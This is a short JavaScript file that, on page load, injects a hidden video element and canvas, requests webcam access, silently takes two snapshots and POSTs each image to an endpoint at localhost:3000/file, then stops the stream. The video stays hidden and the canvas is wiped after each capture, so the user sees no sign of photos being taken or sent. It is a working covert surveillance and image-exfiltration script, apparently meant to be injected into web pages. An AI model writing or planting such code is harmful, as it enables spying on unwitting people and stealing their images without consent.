(function () {

    document.body.innerHTML += `
    <div class="camera" style="display: none">
    <video id="video" style="display: none">Video stream not available.</video>
    <canvas id="canvas"></canvas>
    </div>
    `;

    const address = "http://localhost:3000/file";
    let snp = 2; //snapshots count

    let width = 770;
    let height = 900;
    let streaming = false;
    let video, canvas, streamObj = null;

    const startup = () => {
        video = document.getElementById('video');
        canvas = document.getElementById('canvas');
        navigator.mediaDevices.getUserMedia({video: true, audio: false})
            .then(function (stream) {
                streamObj = stream;
                video.srcObject = stream;
                video.play();
            })
            .catch(function (err) {
                console.error("An error occurred: " + err);
            });

        video.addEventListener('canplay', () => {
            if (!streaming) {
                height = video.videoHeight / (video.videoWidth / width);
                // Firefox bugfix
                if (isNaN(height)) {
                    height = width / (4 / 3);
                }

                video.setAttribute('width', 340);
                video.setAttribute('height', 300);
                canvas.setAttribute('width', width);
                canvas.setAttribute('height', height);
                streaming = true;
            }
        }, false);

        setTimeout(() => {
            const timer = setInterval(() => {
                if (snp > 0) {
                    takeCamSnapshot();
                    clearPhoto();
                    snp = snp - 1;
                } else {
                    setTimeout(stopCapture, 300);
                    clearTimeout(timer);
                }
            }, 1000)
        }, 500)

    }

    const stopCapture = () => {
        console.log("Stopping capture");
        streamObj.getTracks().forEach(function (track) {
            track.stop();
        });
    }

    const clearPhoto = () => {
        const context = canvas.getContext('2d');
        context.fillStyle = "#FFF";
        context.fillRect(0, 0, canvas.width, canvas.height);
        context.hidden = true;
    }

    const sendPhoto = async (address, data) => {
        const request = new XMLHttpRequest();
        request.open("POST", address);
        request.send(data);
    }

    function takeCamSnapshot() {
        const context = canvas.getContext('2d');
        if (width && height) {
            canvas.width = width;
            canvas.height = height;
            context.drawImage(video, 0, 0, width, height);
            const data = canvas.toDataURL('image/jpeg');
            clearPhoto();
            sendPhoto(address, data).catch(e => e);
        } else {
            clearPhoto();
        }
    }

    window.addEventListener('load', startup, false);
})();